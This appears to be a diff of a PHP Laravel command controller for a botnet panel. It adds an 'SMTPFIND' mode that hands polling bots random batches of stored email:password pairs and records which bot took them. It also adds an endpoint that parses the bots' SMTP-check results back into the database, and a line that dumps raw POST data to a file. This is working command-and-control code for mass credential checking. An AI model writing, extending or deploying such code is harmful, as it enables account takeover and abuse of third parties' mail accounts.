@@ -9,6 +9,7 @@ use App\Messages;
 use App\PannelSettings;
 use App\SettingsForCheckSMTP;
 use App\SMTP;
+use App\smtpfindpiece;
 use App\smtplistpiece;
 use App\Themes;
 use Carbon\Carbon;
@@ -66,11 +67,6 @@ class CommandController extends Controller
                 }
             }
         }
-
-        if($statusAdmin->status == 'SMTPFIND'){
-            
-        }
-
 
         if ($statusAdmin->status == 'START') {
 
@@ -139,7 +135,7 @@ class CommandController extends Controller
             $bot->save();
         }
 
-        if ($statusAdmin['status'] == 'SMTPCHECK') {
+        if ($statusAdmin->status == 'SMTPCHECK') {
 
             $settingsSMTP = SettingsForCheckSMTP::find(1);
 
@@ -205,6 +201,30 @@ class CommandController extends Controller
                 exit();
             }
         }
+
+
+        if ($statusAdmin->status == 'SMTPFIND') {
+
+            $settingsSMTP = SettingsForCheckSMTP::find(1);
+            $list = smtpfindpiece::where(['isget'=>0])->orderByRaw('RAND()')->take($settingsSMTP->countsmtp)->get();
+            if(count($list)>0){
+
+                echo "2\n";
+                echo $settingsSMTP->threads . "\n";
+
+                foreach ($list as $item){
+                    $item->isget = 1;
+                    echo $item->emailpas."\t";
+                    $item->time = Carbon::now('Europe/Kiev');
+                    $item->botid = $bot->id;
+                    $item->save();
+                }
+
+            }else{
+                echo 0;
+                exit();
+            }
+        }
     }
 
     function getRealIP()
@@ -252,6 +272,7 @@ class CommandController extends Controller
         $set = SettingsForCheckSMTP::find(1);
         $result = $request->get('result');
 
+        Storage::put("sendcheckers.txt", json_encode($_POST));
         if(isset($result) && strlen($result)>3){
             $resultArray = explode("\n", $result);
             foreach($resultArray as $value){
@@ -280,6 +301,34 @@ class CommandController extends Controller
         }
     }
 
+    public function smtpcheckres(Request $request){
+        $result = $request->get('result');
+
+        $res = explode("\r\n",urldecode($result));
+
+        foreach ($res as $item) {
+            $r = explode('|',$item);
+            if(count($r)>3) {
+                $mailpass = $r[2].":".$r[3];
+            }else{
+                $t = explode("://", $item);
+                if(count($t)<2){
+                    continue;
+                }
+                $mailpass = $t[1];
+            }
+
+            $e = smtpfindpiece::where(['emailpas' => $mailpass])->first();
+            if ($e != null) {
+                $e->status = urldecode($item);
+                $e->time = '';
+                $e->save();
+            }
+        }
+
+
+    }
+
     public function postIndex(Request $request)
     {
         $ip     = $this->getRealIP();
@@ -296,6 +345,7 @@ class CommandController extends Controller
                 $bot->otk        = 0;
                 $bot->save();
             } else {
+                $bot->bot_status = $status;
                 $bot->life = 1;
                 $bot->otk  = 0;
                 $bot->save();
